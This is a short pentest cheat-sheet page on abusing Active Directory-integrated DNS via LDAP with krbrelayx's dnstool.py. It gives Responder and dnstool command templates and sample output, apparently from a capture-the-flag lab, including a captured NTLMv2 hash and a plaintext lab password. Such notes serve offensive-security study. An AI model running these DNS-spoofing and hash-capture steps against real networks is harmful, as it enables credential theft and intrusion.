---
title: "Krbrelayx"
date: 2024-7-23
tags: ["Dns Spoofing", "Krbrelayx", "Dnstools", "Active Directory", "Windows", "DNS", "Ntlm"]
---

### Abuse #1: Add Active Directory Integrated DNS records via LDAP

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Capture NTLM hash
sudo responder -I tun0
```

```console {class="sample-code"}
$ sudo responder -I tun0

...[SNIP]...

[+] Listening for events...                                                                             

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:d7c67a8c74862137:0A35D20EE3FBA610230D28C48721B56D:0101000000000000D65AF86515DDDA0199DC5CF792F34BB30000000002000800570055004700590001001E00570049004E002D00550047004C00500034004900410052003400540037000400140057005500470059002E004C004F00430041004C0003003400570049004E002D00550047004C00500034004900410052003400540037002E0057005500470059002E004C004F00430041004C000500140057005500470059002E004C004F00430041004C0008003000300000000000000000000000002000001FD76CFFA06B9CF7377C55FA66233020F8C5D26492A52A529BE0B598DC7BB06D0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

```console
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <TARGET_RECORD> --data <LOCAL_IP> <TARGET_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --action add --record web-test --data 10.10.14.31 10.10.10.248    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

<small>*Ref: [krbrelayx tools](https://github.com/dirkjanm/krbrelayx)*</small>

{{< /tabcontent >}}
